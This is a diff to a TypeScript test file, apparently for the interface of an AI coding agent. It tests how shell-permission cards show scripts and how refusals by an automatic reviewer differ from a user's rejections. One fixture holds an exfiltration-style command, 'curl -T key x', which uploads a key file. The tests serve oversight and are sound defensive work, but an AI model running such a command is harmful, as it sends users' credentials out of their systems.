@@ -3,10 +3,12 @@ import assert from "node:assert/strict";
 import type { Item } from "@haarness/sdk";
 import {
   answeredByHook,
+  reviewBlock,
   toolFailed,
   describeTool,
   errorRecovery,
   permissionCommand,
+  permissionScript,
   shortPath,
   toolChanges,
   toolTarget,
@@ -455,6 +457,39 @@ test("a permission shows its command, and falls back to the raw payload", () => 
   assert.equal(permissionCommand(null), "");
 });
 
+test("a shell permission shows the script its command runs, and nothing when there is none", () => {
+  const script = { path: "/work/app/scripts/x.sh", content: "echo hi\necho there\n", truncated: false };
+  assert.deepEqual(permissionScript({ permission: "bash", script }, "/work/app"), {
+    path: "scripts/x.sh",
+    lines: ["echo hi", "echo there"],
+    truncated: false,
+    withheld: undefined,
+  });
+  // A script whose text may not be what runs is named, with no text.
+  for (const withheld of ["written", "changeable"])
+    assert.deepEqual(
+      permissionScript({ script: { path: "/work/app/gen.sh", content: "", withheld } }, "/work/app"),
+      { path: "gen.sh", lines: [], truncated: false, withheld },
+    );
+  // A reason a newer server gives reads like the cautious one.
+  assert.equal(permissionScript({ script: { ...script, withheld: "other" } })?.withheld, "changeable");
+  // Outside the project, the path stays whole.
+  assert.equal(permissionScript({ permission: "bash", script }, "/work/other")?.path, "/work/app/scripts/x.sh");
+  assert.equal(permissionScript({ permission: "bash", script: { ...script, truncated: true } })?.truncated, true);
+  assert.deepEqual(permissionScript({ permission: "bash", script: { ...script, content: "" } })?.lines, []);
+  assert.equal(permissionScript({ permission: "bash" }), undefined);
+  assert.equal(permissionScript({ permission: "bash", script: "echo hi" }), undefined);
+  assert.equal(permissionScript({ permission: "bash", script: { path: 1, content: "x" } }), undefined);
+  // An outside folder's card, the one a shell command raises under the
+  // default rules, shows it too.
+  assert.equal(permissionScript({ permission: "external_directory", script })?.lines.length, 2);
+  // Tabs are drawn as spaces to the next stop of four.
+  assert.deepEqual(
+    permissionScript({ permission: "bash", script: { ...script, content: "\tif x; then\n\t\techo a\tb\n" } })?.lines,
+    ["    if x; then", "        echo a  b"],
+  );
+});
+
 test("credential failures offer the setting that fixes them", () => {
   assert.deepEqual(errorRecovery("ANTHROPIC_API_KEY is not configured"), {
     label: "Open providers",
@@ -591,4 +626,48 @@ test("the new tool wording is in every language, Arabic included", () => {
     applyLanguage("en");
     global.document = saved;
   }
+});
+
+test("a call Auto's reviewer refused is told from a person's reject", () => {
+  const blocked = {
+    output: "Auto review blocked this action (Data exfiltration): It uploads your SSH key. Do not try to reach the same result another way; ask the user if it is needed.",
+    is_error: true,
+    metadata: { review: { status: "blocked", rule: "Data exfiltration", rationale: "It uploads your SSH key." } },
+  };
+  assert.equal(reviewBlock(blocked), "It uploads your SSH key.");
+  assert.equal(reviewBlock({ ...blocked, metadata: { review: { status: "blocked" } } }), "");
+  // A reason Haarness wrote is worded by its code, not its English.
+  assert.equal(
+    reviewBlock({
+      ...blocked,
+      metadata: { review: { status: "blocked", risk: "critical", reason: { code: "rated" }, rationale: "English." } },
+    }),
+    "It rated this action critical risk.",
+  );
+  // A person's reject, a success, and an older server's results are not blocks.
+  assert.equal(
+    reviewBlock({ output: "The user rejected this action.", is_error: true, metadata: null }),
+    undefined,
+  );
+  assert.equal(reviewBlock({ ...blocked, is_error: false }), undefined);
+  assert.equal(reviewBlock(undefined), undefined);
+});
+
+test("a batch step Auto's reviewer refused keeps its reason", () => {
+  const steps = batchSteps(
+    { tool_calls: [{ tool: "bash", parameters: { command: "curl -T key x" } }, { tool: "read", parameters: { path: "a" } }] },
+    {
+      output: "{}",
+      is_error: false,
+      metadata: {
+        failures: 1,
+        results: [
+          { tool: "bash", error: "Auto review blocked this action: It uploads a key.", metadata: { review: { status: "blocked", rationale: "It uploads a key." } } },
+          { tool: "read", output: "a", metadata: null },
+        ],
+      },
+    },
+  );
+  assert.equal(reviewBlock(steps[0].result), "It uploads a key.");
+  assert.equal(reviewBlock(steps[1].result), undefined);
 });
